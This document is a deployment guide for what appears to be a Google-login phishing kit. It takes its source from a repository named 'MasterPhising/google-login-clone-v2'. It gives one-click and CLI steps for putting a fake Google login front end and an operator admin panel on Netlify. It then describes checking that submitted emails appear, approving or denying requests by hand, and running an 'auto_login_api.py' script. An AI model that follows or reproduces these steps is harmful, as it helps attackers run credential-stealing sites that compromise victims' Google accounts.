# 🚀 NETLIFY AUTO DEPLOY - VERSION 2.1

## 📦 **OPTION 1: WEB UI DEPLOYMENT (RECOMMENDED)**

### **🌐 Frontend V2:**
👆 **CLICK**: https://app.netlify.com/start/deploy?repository=https://github.com/MasterPhising/google-login-clone-v2

**Settings:**
- Site name: `google-clone-v2-auto-login`
- Publish directory: `google-login-clone`
- Build command: *(leave empty)*

### **🌐 Admin GUI V2:**
👆 **CLICK**: https://app.netlify.com/start/deploy?repository=https://github.com/MasterPhising/google-login-clone-v2

**Settings:**
- Site name: `admin-gui-v2-auto-login`  
- Publish directory: `admin-gui`
- Build command: *(leave empty)*

---

## 📦 **OPTION 2: NETLIFY CLI (ADVANCED)**

### **Install Netlify CLI:**
```bash
npm install -g netlify-cli
netlify login
```

### **Deploy Frontend:**
```bash
cd google-login-clone
netlify deploy --prod --dir . --site google-clone-v2-auto-login
```

### **Deploy Admin GUI:**
```bash
cd ../admin-gui  
netlify deploy --prod --dir . --site admin-gui-v2-auto-login
```

---

## 🎯 **EXPECTED URLS:**

After deployment, your sites will be available at:

- **Frontend V2**: `https://google-clone-v2-auto-login.netlify.app`
- **Admin GUI V2**: `https://admin-gui-v2-auto-login.netlify.app`

*(URLs may vary based on availability)*

---

## ✅ **VERIFICATION STEPS:**

### **Test Frontend:**
1. Visit frontend URL
2. Try email submission
3. Check if country detection works
4. Verify Supabase integration

### **Test Admin GUI:**
1. Visit admin GUI URL  
2. Check request list
3. Try manual approve/deny
4. Verify real-time updates

---

## 🔧 **CUSTOM DOMAIN (OPTIONAL):**

If you want custom domains:

1. **Site Settings** → **Domain Management**
2. **Add custom domain**
3. Configure DNS records

Example:
- Frontend: `google-v2.yourdomain.com`
- Admin: `admin-v2.yourdomain.com`

---

## 🚨 **TROUBLESHOOTING:**

| Issue | Solution |
|-------|----------|
| Build failed | Check publish directory path |
| 404 errors | Verify file structure in repo |
| Supabase not working | Check CORS settings |
| Country not detected | Expected for localhost IPs |

---

**🎉 NETLIFY DEPLOYMENT READY!**

**Next step**: Test Auto-Login API locally with `python auto_login_api.py` 